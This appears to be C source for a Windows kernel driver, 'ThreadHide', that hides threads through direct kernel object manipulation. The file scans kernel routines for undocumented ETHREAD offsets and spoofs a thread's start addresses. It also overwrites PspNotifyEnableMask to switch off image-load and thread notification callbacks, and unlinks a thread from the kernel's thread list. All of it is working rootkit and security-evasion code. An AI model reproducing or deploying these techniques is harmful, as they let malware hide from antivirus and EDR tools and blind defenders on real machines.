#include "ThreadHide.h"

ULONG GetPidOffsetInETHREAD()
{
    UNICODE_STRING unFuncName = { 0 };
    RtlInitUnicodeString(&unFuncName, L"PsGetThreadId");
    PUCHAR pSearchStart = MmGetSystemRoutineAddress(&unFuncName);
    if (0 == pSearchStart)
    {
        return 0;
    }

    return *(PULONG)(pSearchStart + 3);
}

ULONG GetStartAddressOffsetInETHREAD()
{
    return GetPidOffsetInETHREAD() - 0x30;
}

ULONG GetWin32StartAddressOffsetInETHREAD()
{
    return GetPidOffsetInETHREAD() + 0x58;
}

NTSTATUS ModifyThreadStartAddr(PETHREAD pEthread, ULONG64 uStartAddr)
{
    if (NULL == pEthread)
    {
        return STATUS_UNSUCCESSFUL;
    }

    *(PULONG_PTR)((PUCHAR)pEthread + GetStartAddressOffsetInETHREAD()) = uStartAddr;
    *(PULONG_PTR)((PUCHAR)pEthread + GetWin32StartAddressOffsetInETHREAD()) = uStartAddr;
    return STATUS_SUCCESS;
}

//8B 05 00 7F 26 00
PULONG GetPspNotifyEnableMaskAddr()
{
    UNICODE_STRING unFuncName = { 0 };
    RtlInitUnicodeString(&unFuncName, L"PsSetLoadImageNotifyRoutineEx");
    PUCHAR pSearchStart = MmGetSystemRoutineAddress(&unFuncName);
    if (0 == pSearchStart)
    {
        RtlInitUnicodeString(&unFuncName, L"PsSetLoadImageNotifyRoutine");
        pSearchStart = MmGetSystemRoutineAddress(&unFuncName);
    }
    if (0 == pSearchStart)
    {
        return NULL;
    }

    for (ULONG i = 0; i < 0x1000; i++)
    {
        if (0x8B == pSearchStart[i] &&
            0x05 == pSearchStart[i + 1])
        {
            LONG lMaskOffset = *(PULONG)&pSearchStart[i + 2];
            return pSearchStart + i + 6 + lMaskOffset;
        }
    }
    return 0;
}

ULONG64 SetThreadNotification(ULONG uNewMask)
{
    ULONG64 PspNotifyEnableMaskAddr = GetPspNotifyEnableMaskAddr();
    if (MmIsAddressValid(PspNotifyEnableMaskAddr))
    {
        ULONG uOldMask = *(PULONG)PspNotifyEnableMaskAddr;
        *(PULONG)PspNotifyEnableMaskAddr = uNewMask;
        return uOldMask;
    }
    return 0;
}

ULONG GetListOffsetInETHREAD()
{
    ULONG uPidOffset = GetPidOffsetInETHREAD();
    if (0 == uPidOffset)
    {
        return 0;
    }

    RTL_OSVERSIONINFOEXW version = { 0 };
    RtlGetVersion(&version);

    if (7600 == version.dwBuildNumber || 7601 == version.dwBuildNumber || version.dwBuildNumber >= 16299/*1709ртио*/)
    {
        return uPidOffset + 0x68;
    }
    else
    {
        return uPidOffset + 0x60;
    }
}

void RemoveThreadFromList(PETHREAD pEthread)
{
    if (MmIsAddressValid(pEthread))
    {
        PLIST_ENTRY pList = (PLIST_ENTRY)((PUCHAR)pEthread + GetListOffsetInETHREAD());
        RemoveEntryList(pList);
        InitializeListHead(pList);
    }
}